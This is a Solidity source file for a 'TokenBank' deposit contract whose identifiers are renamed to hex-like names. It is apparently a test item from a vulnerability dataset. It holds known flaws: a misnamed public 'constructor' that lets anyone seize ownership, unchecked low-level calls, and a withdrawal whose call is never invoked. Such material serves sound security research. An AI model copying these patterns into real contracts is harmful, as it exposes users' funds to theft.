// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Ownable
{
    address _0x6e7ad4;
    address _0x2121a3 = msg.sender;

    function _0x29b250(address _0xe09d59)
    public
    _0x8b8c00
    {
        _0x6e7ad4 = _0xe09d59;
    }

    function _0xf126cf()
    public
    {
        if(msg.sender==_0x6e7ad4)
        {
            _0x2121a3=_0x6e7ad4;
        }
    }

    modifier _0x8b8c00
    {
        if(_0x2121a3 == msg.sender)_;
    }
}

contract Token is Ownable
{
    address _0x2121a3 = msg.sender;
    function WithdrawToken(address _0xeadb8a, uint256 _0xab2589,address _0xb60fdd)
    public
    _0x8b8c00
    {
        _0xeadb8a.call(bytes4(_0x1bf3e4("transfer(address,uint256)")),_0xb60fdd,_0xab2589);
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;

     ///Constructor
    function _0xb9a66e()
    public
    {
        _0x2121a3 = msg.sender;
        MinDeposit = 1 ether;
    }

    function()
    payable
    {
        Deposit();
    }

    function Deposit()
    payable
    {
        if(msg.value>MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }

    function WitdrawTokenToHolder(address _0xdcb568,address _0x1ed54c,uint _0x74e38e)
    public
    _0x8b8c00
    {
        if(Holders[_0xdcb568]>0)
        {
            Holders[_0xdcb568]=0;
            WithdrawToken(_0x1ed54c,_0x74e38e,_0xdcb568);
        }
    }

    function WithdrawToHolder(address _0x76108c, uint _0xdca729)
    public
    _0x8b8c00
    payable
    {
        if(Holders[msg.sender]>0)
        {
            if(Holders[_0x76108c]>=_0xdca729)
            {
                _0x76108c.call.value(_0xdca729);
                Holders[_0x76108c]-=_0xdca729;
            }
        }
    }

    function Bal() public constant returns(uint){return this.balance;}
}